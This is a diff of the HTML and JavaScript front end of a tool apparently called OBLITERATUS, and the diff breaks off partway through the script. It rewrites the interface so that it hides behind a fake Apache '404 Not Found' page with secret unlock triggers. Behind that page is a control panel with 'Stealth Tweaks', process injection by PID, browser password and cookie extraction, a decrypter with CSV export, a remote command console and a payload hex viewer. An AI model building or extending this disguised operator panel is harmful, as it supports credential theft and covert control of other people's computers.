@@ -2,152 +2,913 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>OBLITERATUS QUANTUM - Master Edition</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Not Found</title>
     <style>
-        :root {
-            --ios-blur: blur(40px);
-            --ios-bg: rgba(30, 30, 30, 0.85);
-            --ios-border: rgba(255, 255, 255, 0.1);
-            --accent: #0a84ff;
+        :root { 
+            --mac-red: #ff5f56; 
+            --mac-yellow: #ffbd2e; 
+            --mac-green: #27c93f; 
+            --mac-blue: #007aff;
+            --mac-purple: #af52de;
+            --mac-orange: #ff9500;
+            --mac-pink: #ff2d55;
+            --glass-bg: rgba(30, 30, 30, 0.65);
+            --glass-border: rgba(255, 255, 255, 0.18);
         }
-
-        * { box-sizing: border-box; user-select: none; }
-
-        body, html {
-            margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden;
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
-            background: #000; color: #fff;
-        }
-
-        #desktop {
-            position: relative; width: 100%; height: 100%;
-            background: url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=1964&auto=format&fit=crop') center center / cover;
-        }
-
-        #dock-container { position: absolute; bottom: 30px; width: 100%; display: flex; justify-content: center; z-index: 2000; }
-        #dock { background: rgba(255, 255, 255, 0.15); backdrop-filter: var(--ios-blur); border-radius: 35px; padding: 12px 20px; display: flex; gap: 20px; border: 0.5px solid var(--ios-border); }
-
-        .app-icon { width: 60px; height: 60px; border-radius: 22.5%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: transform 0.3s; }
-        .app-icon:hover { transform: scale(1.2) translateY(-10px); }
-        .app-icon i { font-size: 28px; color: white; }
-        .app-icon.monitor { background: linear-gradient(135deg, #5e5ce6, #3634a3); }
-        .app-icon.terminal { background: linear-gradient(135deg, #1c1c1e, #3a3a3c); }
-        .app-icon.lab { background: linear-gradient(135deg, #ff3b30, #ff9500); }
-
-        .window { position: absolute; background: var(--ios-bg); backdrop-filter: var(--ios-blur); border: 0.5px solid var(--ios-border); border-radius: 22px; overflow: hidden; display: none; flex-direction: column; box-shadow: 0 40px 80px rgba(0,0,0,0.5); z-index: 100; }
-        .window-header { padding: 15px 20px; background: rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; cursor: move; border-bottom: 1px solid rgba(255,255,255,0.05); }
-        .window-title { font-size: 14px; font-weight: 700; color: #fff; }
-        .dot { width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; display: inline-block; cursor: pointer; }
-        .dot.red { background: #ff5f56; } 
-
-        .window-content { padding: 25px; flex-grow: 1; overflow-y: auto; }
-
-        #console { height: 250px; background: #000; padding: 15px; border-radius: 12px; font-family: monospace; font-size: 11px; overflow-y: auto; color: #0a84ff; border: 1px solid rgba(255,255,255,0.05); }
         
-        select, input {
-            width: 100%; padding: 14px; background: #1c1c1e; border: 1px solid #3a3a3c; border-radius: 12px;
-            color: #fff !important; font-size: 15px; margin-bottom: 20px; outline: none;
-        }
-        option { background: #1c1c1e; color: #fff; }
-
-        button { width: 100%; padding: 15px; border: none; border-radius: 15px; background: var(--accent); color: #fff; font-weight: 700; cursor: pointer; transition: 0.2s; }
-        button:hover { filter: brightness(1.2); }
-        button.secondary { background: rgba(255,255,255,0.1); margin-bottom: 10px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         
-        .recommended { color: #ffd60a !important; font-weight: bold; border: 1px solid #ffd60a; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #fff; 
+            color: #333; 
+            margin: 40px; 
+            overflow: hidden; 
+            height: 100vh; 
+        }
+        
+        .apache-view h1 { font-size: 24px; font-weight: 500; cursor: default; user-select: none; }
+        
+        /* AURORA WALLPAPER */
+        #desktop { 
+            display: none; 
+            position: fixed; 
+            inset: 0; 
+            background: 
+                radial-gradient(ellipse at 20% 20%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 80%, rgba(255, 119, 198, 0.15) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 50%, rgba(100, 200, 255, 0.1) 0%, transparent 60%),
+                linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            background-size: 200% 200%;
+            animation: aurora 20s ease infinite;
+            z-index: 9999; 
+            overflow: hidden;
+        }
+
+        @keyframes aurora {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* TOP BAR - Estilo macOS real */
+        #top-bar { 
+            height: 28px; 
+            background: rgba(0,0,0,0.2); 
+            backdrop-filter: blur(25px) saturate(180%); 
+            -webkit-backdrop-filter: blur(25px) saturate(180%);
+            display: flex; 
+            align-items: center; 
+            padding: 0 16px; 
+            color: #fff; 
+            font-size: 13px; 
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+            position: relative;
+            z-index: 10000;
+        }
+        
+        .menu-apple { 
+            font-weight: 800; 
+            margin-right: 20px; 
+            cursor: pointer;
+            font-size: 14px;
+            transition: opacity 0.2s;
+        }
+        .menu-apple:hover { opacity: 0.7; }
+        
+        .menu-item {
+            margin-right: 16px;
+            cursor: pointer;
+            opacity: 0.9;
+            transition: opacity 0.2s;
+            font-weight: 500;
+        }
+        .menu-item:hover { opacity: 1; }
+        
+        #admin-status { 
+            font-size: 10px; 
+            color: #aaa; 
+            background: rgba(255,255,255,0.08); 
+            padding: 2px 8px; 
+            border-radius: 4px;
+            border: 1px solid rgba(255,255,255,0.05);
+            font-family: 'SF Mono', monospace;
+        }
+        
+        #clock {
+            font-variant-numeric: tabular-nums;
+            font-weight: 500;
+        }
+
+        /* VENTANAS - Glassmorphism mejorado */
+        .window { 
+            position: absolute; 
+            background: var(--glass-bg); 
+            backdrop-filter: blur(50px) saturate(180%);
+            -webkit-backdrop-filter: blur(50px) saturate(180%);
+            border: 1px solid var(--glass-border); 
+            border-radius: 12px; 
+            box-shadow: 
+                0 0 0 1px rgba(0,0,0,0.2),
+                0 20px 60px rgba(0,0,0,0.5),
+                0 1px 0 rgba(255,255,255,0.1) inset; 
+            display: none; 
+            flex-direction: column;
+            transition: transform 0.15s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.15s ease;
+            overflow: hidden;
+            min-width: 300px;
+            min-height: 200px;
+        }
+        
+        .window.active {
+            box-shadow: 
+                0 0 0 1px rgba(0,0,0,0.3),
+                0 30px 80px rgba(0,0,0,0.6),
+                0 1px 0 rgba(255,255,255,0.15) inset;
+        }
+        
+        .window-header { 
+            height: 42px; 
+            display: flex; 
+            align-items: center; 
+            padding: 0 14px; 
+            cursor: move; 
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            background: linear-gradient(to bottom, rgba(255,255,255,0.05) 0%, transparent 100%);
+        }
+        
+        .window-controls { 
+            display: flex; 
+            gap: 8px; 
+            width: 80px; 
+        }
+        
+        .dot { 
+            width: 12px; 
+            height: 12px; 
+            border-radius: 50%; 
+            border: 1px solid rgba(0,0,0,0.1);
+            position: relative;
+            transition: transform 0.1s;
+        }
+        .dot:hover { transform: scale(1.1); }
+        .dot::after {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 3px;
+            width: 5px;
+            height: 3px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.4);
+            filter: blur(0.5px);
+        }
+        
+        .close { background: var(--mac-red); cursor: pointer; } 
+        .minimize { background: var(--mac-yellow); } 
+        .maximize { background: var(--mac-green); }
+        
+        .window-title { 
+            flex-grow: 1; 
+            text-align: center; 
+            font-size: 13px; 
+            font-weight: 600; 
+            color: #fff; 
+            opacity: 0.9;
+            letter-spacing: 0.3px;
+            pointer-events: none;
+        }
+        
+        .window-content { 
+            flex-grow: 1; 
+            padding: 18px; 
+            overflow-y: auto; 
+            color: #efefef; 
+            font-size: 13px;
+        }
+
+        /* DOCK - Magnificación realista */
+        #dock-container {
+            position: absolute;
+            bottom: 12px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 10000;
+        }
+        
+        #dock { 
+            background: rgba(255,255,255,0.12); 
+            backdrop-filter: blur(35px) saturate(180%);
+            -webkit-backdrop-filter: blur(35px) saturate(180%);
+            padding: 10px 16px; 
+            border-radius: 24px; 
+            display: flex; 
+            gap: 0; 
+            border: 1px solid rgba(255,255,255,0.15); 
+            box-shadow: 
+                0 10px 40px rgba(0,0,0,0.4),
+                0 0 0 1px rgba(255,255,255,0.05) inset;
+            position: relative;
+        }
+        
+        .dock-icon-wrapper {
+            position: relative;
+            padding: 0 6px;
+            display: flex;
+            align-items: flex-end;
+            height: 60px;
+        }
+        
+        .dock-icon { 
+            width: 52px; 
+            height: 52px; 
+            border-radius: 14px; 
+            cursor: pointer; 
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            background: rgba(255,255,255,0.05);
+            position: relative;
+            transform-origin: bottom center;
+        }
+        
+        .dock-icon svg { 
+            width: 32px; 
+            height: 32px; 
+            filter: drop-shadow(0 2px 5px rgba(0,0,0,0.3)); 
+        }
+        
+        .dock-icon:hover { 
+            transform: scale(1.35) translateY(-12px); 
+            background: rgba(255,255,255,0.2);
+            margin: 0 8px;
+        }
+        
+        .dock-icon:active { transform: scale(1.2) translateY(-8px); }
+        
+        /* Indicador de app abierta */
+        .dock-dot {
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.8);
+            position: absolute;
+            bottom: -8px;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .dock-icon.open .dock-dot { opacity: 1; }
+
+        /* Reflejo del dock */
+        #dock::after {
+            content: '';
+            position: absolute;
+            bottom: -20px;
+            left: 10%;
+            right: 10%;
+            height: 20px;
+            background: radial-gradient(ellipse at center, rgba(0,0,0,0.3) 0%, transparent 70%);
+            filter: blur(10px);
+            z-index: -1;
+        }
+
+        .btn-mac { 
+            border: none; 
+            border-radius: 8px; 
+            padding: 10px 14px; 
+            font-size: 12px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: all 0.2s; 
+            width: 100%; 
+            margin-bottom: 10px; 
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-mac:active { transform: scale(0.97); }
+        
+        .btn-blue { 
+            background: linear-gradient(180deg, #0a84ff 0%, #007aff 100%); 
+            color: #fff; 
+            box-shadow: 0 1px 3px rgba(0,122,255,0.3);
+        } 
+        .btn-blue:hover { background: linear-gradient(180deg, #1a8fff 0%, #0a84ff 100%); }
+        
+        .btn-red { 
+            background: linear-gradient(180deg, #ff453a 0%, #ff3b30 100%); 
+            color: #fff; 
+            box-shadow: 0 1px 3px rgba(255,59,48,0.3);
+        } 
+        .btn-red:hover { background: linear-gradient(180deg, #ff574d 0%, #ff453a 100%); }
+        
+        .btn-ghost { 
+            background: rgba(255,255,255,0.08); 
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.1);
+        } 
+        .btn-ghost:hover { 
+            background: rgba(255,255,255,0.15); 
+            border-color: rgba(255,255,255,0.2);
+        }
+        
+        table { width: 100%; border-collapse: collapse; }
+        th { 
+            text-align: left; 
+            color: #999; 
+            font-size: 11px; 
+            padding: 8px; 
+            border-bottom: 1px solid rgba(255,255,255,0.1); 
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        td { 
+            padding: 10px 8px; 
+            border-bottom: 1px solid rgba(255,255,255,0.05); 
+            font-size: 12px; 
+            transition: background 0.15s;
+        }
+        .row-proc:hover { 
+            background: rgba(255,255,255,0.06); 
+            cursor: pointer; 
+        }
+        .selected { 
+            background: rgba(0,122,255,0.3) !important; 
+            box-shadow: 0 0 0 1px rgba(0,122,255,0.5) inset;
+        }
+        
+        .terminal { 
+            font-family: 'SF Mono', 'Fira Code', monospace; 
+            background: rgba(0,0,0,0.5); 
+            color: #00ff41; 
+            padding: 15px; 
+            border-radius: 10px; 
+            overflow-y: auto; 
+            font-size: 12px; 
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
+        }
+        
+        input { 
+            background: rgba(255,255,255,0.06); 
+            border: 1px solid rgba(255,255,255,0.1); 
+            color: #fff; 
+            padding: 12px; 
+            border-radius: 10px; 
+            width: 100%; 
+            box-sizing: border-box; 
+            outline: none; 
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+        input:focus {
+            border-color: rgba(0,122,255,0.5);
+            background: rgba(255,255,255,0.08);
+            box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
+        }
+        
+        pre { margin: 0; white-space: pre-wrap; font-family: inherit; }
+
+        /* Scrollbar personalizada */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.3); }
+
+        /* Animación de entrada de ventana */
+        @keyframes windowIn {
+            from { opacity: 0; transform: scale(0.9) translateY(20px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+        .window.showing { animation: windowIn 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+
+        /* Tooltip del dock */
+        .dock-tooltip {
+            position: absolute;
+            bottom: 70px;
+            left: 50%;
+            transform: translateX(-50%) translateY(10px);
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 500;
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.2s;
+            white-space: nowrap;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .dock-icon-wrapper:hover .dock-tooltip {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
     </style>
-    <script src="https://unpkg.com/lucide@latest"></script>
+<base target="_blank">
 </head>
-<body>
+<body onkeydown="if(event.key==='F2')window.unlock()">
+    <div id="apache-view">
+        <div style="position:fixed; top:0; left:0; width:60px; height:60px; cursor:pointer;" onclick="window.unlock()"></div>
+        <h1 onclick="window.handleTrigger()">Not Found</h1>
+        <p>The requested URL was not found on this server.</p>
+        <hr><div class="footer">Apache/2.4.52 (Ubuntu) Server at localhost Port 8080</div>
+    </div>
+
     <div id="desktop">
-        <div id="win-monitor" class="window" style="top: 80px; left: 50px; width: 380px;">
-            <div class="window-header"><div class="window-title"><span class="dot red" onclick="closeApp('monitor')"></span>Environment</div></div>
+        <div id="top-bar">
+            <span class="menu-apple" onclick="window.unlock()"></span>
+            <span class="menu-item" style="font-weight:700;">OBLITERATUS</span>
+            <span class="menu-item">File</span>
+            <span class="menu-item">Edit</span>
+            <span class="menu-item">View</span>
+            <span class="menu-item">Window</span>
+            <span class="menu-item">Help</span>
+            <span id="admin-status" style="margin-left: auto; margin-right: 16px;">[CHECKING...]</span>
+            <div style="flex-grow:1"></div>
+            <span id="clock"></span>
+        </div>
+
+        <div id="win-opt" class="window" style="width: 380px; left: 80px; top: 60px;">
+            <div class="window-header" onmousedown="window.startDrag(event, 'win-opt')">
+                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('opt')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
+                <div class="window-title">System Optimizer</div>
+            </div>
             <div class="window-content">
-                <select id="processList" size="10" style="height: 200px;"></select>
-                <button class="secondary" id="refreshProcs">RESCAN</button>
-                <button id="intelBtn" style="background: linear-gradient(135deg, #5e5ce6, #af52de);">IA INTEL</button>
+                <button class="btn-mac btn-blue" onclick="window.applyTweaks()">Apply Stealth Tweaks</button>
+                <div id="opt-log" class="terminal" style="height: 120px;"></div>
             </div>
         </div>
 
-        <div id="win-terminal" class="window" style="top: 80px; left: 450px; width: 500px;">
-            <div class="window-header"><div class="window-title"><span class="dot red" onclick="closeApp('terminal')"></span>System Console</div></div>
-            <div class="window-content"><div id="console"></div></div>
-        </div>
-
-        <div id="win-lab" class="window" style="top: 400px; left: 50px; width: 380px;">
-            <div class="window-header"><div class="window-title"><span class="dot red" onclick="closeApp('lab')"></span>Signal Architect</div></div>
+        <div id="win-proc" class="window" style="width: 600px; left: 500px; top: 60px;">
+            <div class="window-header" onmousedown="window.startDrag(event, 'win-proc')">
+                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('proc')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
+                <div class="window-title">Processes</div>
+            </div>
             <div class="window-content">
-                <select id="payloadType"><option value="research">Research Pattern</option></select>
-                <input type="number" id="pid" placeholder="Target PID">
-                <button id="loadBtn" style="background: #ff3b30;">QUANTUM SYNC</button>
+                <input type="text" id="p-search" placeholder="Filter processes..." oninput="window.filterProcs()">
+                <div style="height: 380px; overflow-y:auto; margin-top:10px;">
+                    <table>
+                        <thead><tr><th>PID</th><th>IMAGE</th><th>OWNER</th><th>MEM</th></tr></thead>
+                        <tbody id="proc-body"></tbody>
+                    </table>
+                </div>
             </div>
         </div>
 
-        <div id="dock-container"><div id="dock">
-            <div class="app-icon monitor" onclick="toggleApp('monitor')"><i data-lucide="activity"></i></div>
-            <div class="app-icon terminal" onclick="toggleApp('terminal')"><i data-lucide="terminal"></i></div>
-            <div class="app-icon lab" onclick="toggleApp('lab')"><i data-lucide="zap"></i></div>
-        </div></div>
+        <div id="win-sig" class="window" style="width: 380px; left: 80px; top: 340px;">
+            <div class="window-header" onmousedown="window.startDrag(event, 'win-sig')">
+                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('sig')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
+                <div class="window-title">Architect</div>
+            </div>
+            <div class="window-content">
+                <input type="text" id="target-pid" readonly style="text-align:center; color:#0f0; font-size:24px; margin-bottom:15px; letter-spacing: 2px;">
+                <button class="btn-mac btn-red" onclick="window.injectSignal()">⚡ Quantum Sync</button>
+                <button class="btn-mac btn-ghost" onclick="window.extractNexus()">🔗 Nexus Correlation</button>
+                <button class="btn-mac btn-ghost" onclick="window.extractIntel()">🔑 Passwords</button>
+                <button class="btn-mac btn-ghost" onclick="window.extractCookies()">🍪 Cookies</button>
+            </div>
+        </div>
+
+        <div id="win-intel" class="window" style="width: 850px; right: 80px; top: 120px; height: 500px;">
+            <div class="window-header" onmousedown="window.startDrag(event, 'win-intel')">
+                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('intel')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
+                <div class="window-title">Decrypter</div>
+                <button onclick="window.exportCSV()" style="background:none; border:none; color:var(--mac-blue); cursor:pointer; font-size:12px; font-weight:800; margin-left: auto; padding: 0 10px;">[CSV]</button>
+            </div>
+            <div class="window-content">
+                <table>
+                    <thead id="intel-head"></thead>
+                    <tbody id="intel-body"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div id="win-cons" class="window" style="width: 650px; left: 500px; top: 480px; height: 380px;">
+            <div class="window-header" onmousedown="window.startDrag(event, 'win-cons')">
+                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('cons')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
+                <div class="window-title">Console</div>
+            </div>
+            <div class="window-content">
+                <div id="console-out" class="terminal" style="height: 280px; margin-bottom:15px; overflow-y: auto;"></div>
+                <input type="text" id="cmd-in" placeholder="Command..." onkeydown="if(event.key==='Enter')window.runCmd()">
+            </div>
+        </div>
+
+        <div id="win-hex" class="window" style="width: 450px; left: 80px; top: 620px;">
+            <div class="window-header" onmousedown="window.startDrag(event, 'win-hex')">
+                <div class="window-controls"><div class="dot close" onclick="window.toggleWin('hex')"></div><div class="dot minimize"></div><div class="dot maximize"></div></div>
+                <div class="window-title">Live Hex-Viewer</div>
+            </div>
+            <div class="window-content terminal" id="hex-body" style="font-size: 11px; height: 180px; color:#00ff41; background:rgba(0,0,0,0.5);">[LOADING_PAYLOAD...]</div>
+        </div>
+
+        <!-- DOCK MEJORADO -->
+        <div id="dock-container">
+            <div id="dock">
+                <div class="dock-icon-wrapper">
+                    <div class="dock-icon" data-win="opt" onclick="window.toggleWin('opt')">
+                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-opt)"/><defs><linearGradient id="grad-opt" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#0a84ff"/><stop offset="100%" style="stop-color:#007aff"/></linearGradient></defs><path d="M32 18l12 6v10c0 8-12 12-12 12s-12-4-12-12V24l12-6z" fill="white" opacity="0.9"/></svg>
+                        <div class="dock-dot"></div>
+                    </div>
+                    <div class="dock-tooltip">Optimizer</div>
+                </div>
+                
+                <div class="dock-icon-wrapper">
+                    <div class="dock-icon" data-win="proc" onclick="window.toggleWin('proc')">
+                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-proc)"/><defs><linearGradient id="grad-proc" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#34c759"/><stop offset="100%" style="stop-color:#30d158"/></linearGradient></defs><path d="M20 44V30M32 44V20M44 44V35" stroke="white" stroke-width="5" stroke-linecap="round"/></svg>
+                        <div class="dock-dot"></div>
+                    </div>
+                    <div class="dock-tooltip">Processes</div>
+                </div>
+                
+                <div class="dock-icon-wrapper">
+                    <div class="dock-icon" data-win="sig" onclick="window.toggleWin('sig')">
+                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-sig)"/><defs><linearGradient id="grad-sig" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ff9f0a"/><stop offset="100%" style="stop-color:#ff9500"/></linearGradient></defs><path d="M35 15l-15 20h12l-3 15 20-25h-12l3-10z" fill="white"/></svg>
+                        <div class="dock-dot"></div>
+                    </div>
+                    <div class="dock-tooltip">Architect</div>
+                </div>
+                
+                <div class="dock-icon-wrapper">
+                    <div class="dock-icon" data-win="intel" onclick="window.toggleWin('intel')">
+                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-intel)"/><defs><linearGradient id="grad-intel" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#5e5ce6"/><stop offset="100%" style="stop-color:#5856d6"/></linearGradient></defs><circle cx="32" cy="28" r="8" stroke="white" stroke-width="4" fill="none"/><path d="M32 36v10" stroke="white" stroke-width="4"/></svg>
+                        <div class="dock-dot"></div>
+                    </div>
+                    <div class="dock-tooltip">Decrypter</div>
+                </div>
+                
+                <div class="dock-icon-wrapper">
+                    <div class="dock-icon" data-win="cons" onclick="window.toggleWin('cons')">
+                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-cons)"/><defs><linearGradient id="grad-cons" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#2c2c2e"/><stop offset="100%" style="stop-color:#1c1c1e"/></linearGradient></defs><path d="M22 25l8 7-8 7M34 39h10" stroke="white" stroke-width="4" stroke-linecap="round"/></svg>
+                        <div class="dock-dot"></div>
+                    </div>
+                    <div class="dock-tooltip">Terminal</div>
+                </div>
+                
+                <div class="dock-icon-wrapper">
+                    <div class="dock-icon" data-win="hex" onclick="window.toggleWin('hex')">
+                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-hex)"/><defs><linearGradient id="grad-hex" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ff375f"/><stop offset="100%" style="stop-color:#ff2d55"/></linearGradient></defs><text x="16" y="42" fill="white" font-size="14" font-weight="900">0101</text></svg>
+                        <div class="dock-dot"></div>
+                    </div>
+                    <div class="dock-tooltip">Hex Viewer</div>
+                </div>
+                
+                <div style="width: 1px; height: 40px; background: rgba(255,255,255,0.15); margin: 10px 8px 0 8px;"></div>
+                
+                <div class="dock-icon-wrapper">
+                    <div class="dock-icon" onclick="window.unlock()">
+                        <svg viewBox="0 0 64 64"><rect x="10" y="10" width="44" height="44" rx="12" fill="url(#grad-reset)"/><defs><linearGradient id="grad-reset" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ff453a"/><stop offset="100%" style="stop-color:#ff3b30"/></linearGradient></defs><path d="M32 20l-12 12h24l-12 12" stroke="white" stroke-width="4" stroke-linecap="round"/></svg>
+                    </div>
+                    <div class="dock-tooltip">Reset</div>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
-        lucide.createIcons();
-        const socket = new WebSocket('ws://' + window.location.host + '/ws');
-        const consoleEl = document.getElementById('console');
-        const procSelect = document.getElementById('processList');
-        const pidInput = document.getElementById('pid');
+        window.clicks = 0; 
+        window.selectedPid = null; 
+        window.socket = null;
+        window.apiToken = "SIGNAL_" + location.port;
+        window.openWindows = new Set(['opt', 'proc', 'sig']);
+        
+        window.handleTrigger = function() { 
+            if (++window.clicks === 3) window.unlock(); 
+        };
+        
+        window.unlock = function() {
+            document.getElementById('apache-view').style.display = 'none';
+            document.getElementById('desktop').style.display = 'block';
+            window.initWS(); 
+            window.fetchProcs(); 
+            window.checkStatus(); 
+            window.loadHex();
+            ['opt','proc','sig'].forEach(id => {
+                const w = document.getElementById('win-'+id);
+                w.style.display='flex';
+                w.classList.add('showing');
+                window.updateDockState(id, true);
+            });
+        };
+        
+        window.toggleWin = function(id) { 
+            const w = document.getElementById('win-'+id); 
+            const isVisible = w.style.display==='flex';
+            
+            if (isVisible) {
+                w.style.display = 'none';
+                w.classList.remove('showing');
+                window.updateDockState(id, false);
+            } else {
+                w.style.display = 'flex';
+                w.classList.add('showing');
+                w.style.zIndex = ++window.clicks + 1000;
+                window.updateDockState(id, true);
+                // Focus effect
+                document.querySelectorAll('.window').forEach(win => win.classList.remove('active'));
+                w.classList.add('active');
+            }
+        };
+        
+        window.updateDockState = function(winId, isOpen) {
+            const icon = document.querySelector(`.dock-icon[data-win="${winId}"]`);
+            if (icon) {
+                if (isOpen) icon.classList.add('open');
+                else icon.classList.remove('open');
+            }
+        };
+        
+        let activeWin = null, offset = { x: 0, y: 0 };
+        
+        window.startDrag = function(e, id) {
+            activeWin = document.getElementById(id); 
+            activeWin.style.zIndex = ++window.clicks + 1000;
+            // Focus
+            document.querySelectorAll('.window').forEach(w => w.classList.remove('active'));
+            activeWin.classList.add('active');
+            
+            offset.x = e.clientX - activeWin.offsetLeft; 
+            offset.y = e.clientY - activeWin.offsetTop;
+            document.onmousemove = window.doDrag; 
+            document.onmouseup = window.stopDrag;
+            e.preventDefault();
+        };
+        
+        window.doDrag = function(e) { 
+            if(activeWin) { 
+                activeWin.style.left = (e.clientX - offset.x) + 'px'; 
+                activeWin.style.top = (e.clientY - offset.y) + 'px'; 
+            } 
+        };
+        
+        window.stopDrag = function() { 
+            activeWin = null; 
+            document.onmousemove = null; 
+            document.onmouseup = null; 
+        };
 
-        function addLog(m, l) {
-            const e = document.createElement('div'); e.innerHTML = `[${new Date().toLocaleTimeString()}] ${m}`;
-            e.style.color = l === 'SUCCESS' ? '#32d74b' : (l === 'ERROR' ? '#ff453a' : '#0a84ff');
-            consoleEl.appendChild(e); consoleEl.scrollTop = consoleEl.scrollHeight;
-        }
-
-        socket.onmessage = (ev) => { const d = JSON.parse(ev.data); addLog(d.message, d.level); };
-
-        async function refresh() {
-            const res = await fetch('/processes'); const ps = await res.json();
-            procSelect.innerHTML = '';
-            ps.forEach(p => { const o = document.createElement('option'); o.value = p.pid; o.textContent = `${p.name} [${p.pid}]`; procSelect.appendChild(o); });
-            addLog("Rescanned.", "INFO");
-        }
-        procSelect.onchange = () => pidInput.value = procSelect.value;
-        document.getElementById('refreshProcs').onclick = refresh;
-
-        document.getElementById('intelBtn').onclick = async () => {
-            addLog("Analyzing environment...", "INFO");
+        window.initWS = function() {
             try {
-                const res = await fetch('/intelligence');
-                const intel = await res.json();
-                intel.forEach(i => {
-                    const opt = Array.from(procSelect.options).find(o => o.value == i.pid);
-                    if (opt) { opt.className = 'recommended'; opt.textContent = "⭐ " + opt.textContent; }
+                const socket = new WebSocket(`ws://${location.host}/ws`);
+                socket.onmessage = (e) => { 
+                    const d=JSON.parse(e.data); 
+                    if(d.m) window.log(d.m, d.l); 
+                };
+                socket.onerror = () => window.log('WebSocket disconnected', 'ERROR');
+            } catch(e) {
+                window.log('WebSocket init failed', 'ERROR');
+            }
+        };
+        
+        window.checkStatus = async function() { 
+            try {
+                const r = await fetch('/v1/sys/st', {headers:{'X-Signal-Token':window.apiToken}}); 
+                const t = await r.text(); 
+                document.getElementById('admin-status').innerText = '['+t+']';
+                document.getElementById('admin-status').style.color = t.includes('ADMIN') ? '#34c759' : '#aaa';
+            } catch(e) {
+                document.getElementById('admin-status').innerText = '[OFFLINE]';
+                document.getElementById('admin-status').style.color = '#ff3b30';
+            }
+        };
+        
+        window.loadHex = async function() { 
+            try { 
+                const r = await fetch('/v1/sys/hex', {headers:{'X-Signal-Token':window.apiToken}}); 
+                const t = await r.text(); 
+                document.getElementById('hex-body').innerText = t.match(/.{1,2}/g).join(' '); 
+            } catch(e){
+                document.getElementById('hex-body').innerText = '[CONNECTION_FAILED]';
+            } 
+        };
+        
+        window.log = function(m, l) {
+            const d = document.createElement('div'); 
+            d.style.color = (l==='SUCCESS'?'#00ff41':l==='ERROR'?'#ff3b30':'#888');
+            d.style.marginBottom = '2px';
